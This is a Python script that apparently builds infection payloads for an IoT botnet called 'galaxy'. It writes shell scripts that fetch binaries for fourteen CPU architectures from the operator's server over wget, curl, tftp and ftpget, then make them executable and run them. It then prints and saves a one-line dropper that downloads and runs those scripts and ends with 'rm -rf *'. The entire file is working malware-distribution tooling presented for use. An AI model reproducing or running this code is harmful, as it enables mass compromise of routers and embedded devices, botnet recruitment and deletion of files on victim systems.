import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "galaxy"
exec_name = "loader"
bin_prefix = "galaxy."
archs = ["x86",               #1
"mips",                       #2
"mpsl",                       #3
"arm",                        #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"spc",                        #10
"arc",                        #11
"x86_64",                     #12
"i686",                       #13
"sh4"]                        #14


def run(cmd):
    subprocess.call(cmd, shell=True)
print("\033[01;37mPlease wait while your payload generating.")
print(" ")
run('echo "#!/bin/bash" > /root/server/static/galaxy6x.sh')
run('echo "ulimit -n 1024" >> /root/server/static/galaxy6x.sh')
run('echo "cp /bin/busybox /tmp/" >> /root/server/static/galaxy6x.sh')

run('echo "#!/bin/bash" > /root/server/static/galaxy6x2.sh')
run('echo "ulimit -n 1024" >> /root/server/static/galaxy6x2.sh')
run('echo "cp /bin/busybox /tmp/" >> /root/server/static/galaxy6x2.sh')

run('echo "#!/bin/bash" > /root/server/static/galaxy6x1.sh')
run('echo "ulimit -n 1024" >> /root/server/static/galaxy6x1.sh')
run('echo "cp /bin/busybox /tmp/" >> /root/server/static/galaxy6x1.sh')

run('echo "#!/bin/bash" > /root/server/static/galaxy.sh')

for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /root/server/static/galaxy.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /root/server/static/galaxy6x1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /root/server/static/galaxy6x.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + '; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /root/server/static/galaxy6x2.sh')        
run
print("\x1b[0;31mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/galaxy.sh; curl -O http://" + ip + "/galaxy.sh; chmod 777 galaxy.sh; sh galaxy.sh; tftp " + ip + " -c get galaxy6x.sh; chmod 777 galaxy6x.sh; sh galaxy6x.sh; tftp -r galaxy6x2.sh -g " + ip + "; chmod 777 galaxy6x2.sh; sh galaxy6x2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " galaxy6x1.sh galaxy6x1.sh; sh galaxy6x1.sh; rm -rf galaxy6x.sh galaxy6x.sh galaxy6x2.sh galaxy6x1.sh; rm -rf *\x1b[0m")
print("")
complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/galaxy.sh; curl -O http://" + ip + "/galaxy.sh; chmod 777 galaxy.sh; sh galaxy.sh; tftp " + ip + " -c get galaxy6x.sh; chmod 777 galaxy6x.sh; sh galaxy6x.sh; tftp -r galaxy6x2.sh -g " + ip + "; chmod 777 galaxy6x2.sh; sh galaxy6x2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " galaxy6x1.sh galaxy6x1.sh; sh galaxy6x1.sh; rm -rf galaxy6x.sh galaxy6x.sh galaxy6x2.sh galaxy6x1.sh; rm -rf *")
file = open("payload.txt","w+")
file.write(complete_payload)
file.close()
exit()
raw_input("\033[01;37mYour payload has been generated and saved in payload.txt\033[0m")
